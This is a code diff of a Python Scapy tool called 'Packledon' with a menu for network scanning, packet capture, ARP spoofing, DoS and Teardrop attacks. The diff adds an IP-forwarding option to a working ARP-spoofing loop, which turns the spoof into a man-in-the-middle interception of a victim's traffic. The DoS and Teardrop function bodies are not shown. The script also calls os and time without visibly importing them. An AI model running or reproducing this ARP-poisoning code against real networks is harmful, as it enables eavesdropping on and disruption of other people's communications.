@@ -1,17 +1,11 @@
 #imports
 from itertools import count
 from pyfiglet import Figlet
-import scapy.all as scapy #need scapy for network control/access 
+#import scapy.all as scapy #need scapy for network control/access 
 from scapy.all import *
 import sys
 import ipaddress
-#create banner
-f = Figlet(font='slant')
-print(f.renderText('Packledon'))
 
-print("What would you like to do?\n1. Scan for devices on the network\n2. Create a pcap?\n3. Examin a pcap?\n4. Perform an arp spoof attack?\n5. Perform a Dos attack?\n6. Perform a Teardrop attack?")
-user_determination= input("Please enter your selection from the above choices:" )
-print(user_determination)
 
 #function for arp and ping scanning aka option 1
 def arp_and_ping_scanning():
@@ -79,17 +73,19 @@ def arp_spoofing_attack():
     victim_ip = input("Enter the victim's IP address: ")
     router_ip = input("Enter the router's IP address: ")
 
+    enable_ip_forwarding = input("Do you want to enable IP forwarding? (yes/no): ").strip().lower()
+
     def get_mac(ip):
         """
         Sends an ARP request to get the MAC address of a given IP.
         """
-        arp_request = scapy.ARP(pdst=ip)  
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
-        arp_request_broadcast = broadcast / arp_request  
-        answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  
+        arp_request = ARP(pdst=ip)
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+        arp_request_broadcast = broadcast / arp_request
+        answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
 
-        if answ:  
-            return answ[0][1].hwsrc  
+        if answ:
+            return answ[0][1].hwsrc
         else:
             print(f"[-] Failed to get MAC address for {ip}. Exiting.")
             sys.exit(1)
@@ -98,23 +94,39 @@ def arp_spoofing_attack():
         """
         Creates and sends an ARP spoofing packet to poison the ARP table.
         """
-        target_mac = get_mac(target_arp_ip)  
+        target_mac = get_mac(target_arp_ip)
         if not target_mac:
             return
-        packet = scapy.ARP(op=2, pdst=target_arp_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
+        packet = ARP(op=2, pdst=target_arp_ip, hwdst=target_mac, psrc=spoof_ip)
+        send(packet, verbose=False)
+
+    def enable_linux_ip_forwarding():
+        """ Enables IP forwarding in Linux to allow traffic to pass through. """
+        print("[+] Enabling IP forwarding...")
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+    def disable_linux_ip_forwarding():
+        """ Disables IP forwarding after the attack ends. """
+        print("[+] Disabling IP forwarding...")
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+    # Enable IP forwarding if user chose "yes"
+    if enable_ip_forwarding == "yes":
+        enable_linux_ip_forwarding()
 
     send_packets_count = 0
     try:
-        while True:  
+        while True:
             send_packets_count += 2
-            arp_spoofing(victim_ip, router_ip)  
-            arp_spoofing(router_ip, victim_ip)  
+            arp_spoofing(victim_ip, router_ip)
+            arp_spoofing(router_ip, victim_ip)
             print(f"[+] Packets Sent: {send_packets_count}", end="\r")
-            sys.stdout.flush()  
-            time.sleep(2)  
+            sys.stdout.flush()
+            time.sleep(2)
     except KeyboardInterrupt:
         print("\n[+] Stopping ARP spoofing attack. Restoring ARP tables...")
+        if enable_ip_forwarding == "yes":
+            disable_linux_ip_forwarding()
 
 
 
@@ -175,67 +187,35 @@ def teardrop_attack():
 
 
 
+def main():
+    #create banner
+    f = Figlet(font='slant')
+    print(f.renderText('Packledon'))
+    print("What would you like to do?\n1. Scan for devices on the network\n2. Create a pcap?\n3. Examin a pcap?\n4. Perform an arp spoof attack?\n5. Perform a Dos attack?\n6. Perform a Teardrop attack?")
+    user_determination= input("Please enter your selection from the above choices:" )
+    
+    print(user_determination)
+
+    if user_determination == "1":
+        arp_and_ping_scanning()
+
+    elif user_determination == "2":
+        sniff(prn=packet_handler, count=700)
+
+    elif user_determination == "3":
+        enter_and_read_pcap()
+
+    elif user_determination == "4":
+        arp_spoofing_attack()
+
+    elif user_determination == "5":
+        dos_attack()
+
+    elif user_determination == "6":
+        teardrop_attack()
+    else:
+        print("Please enter a valid selection")
 
 
-
-
-if user_determination == "1":
-    arp_and_ping_scanning()
-
-elif user_determination == "2":
-    sniff(prn=packet_handler, count=700)
-
-elif user_determination == "3":
-    enter_and_read_pcap()
-
-elif user_determination == "4":
-    arp_spoofing_attack()
-
-elif user_determination == "5":
-    dos_attack()
-
-elif user_determination == "6":
-    teardrop_attack()
-else:
-    print("Please enter a valid selection")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#if __name__ == "__main__":
- #   main()
+if __name__ == "__main__":
+    main()
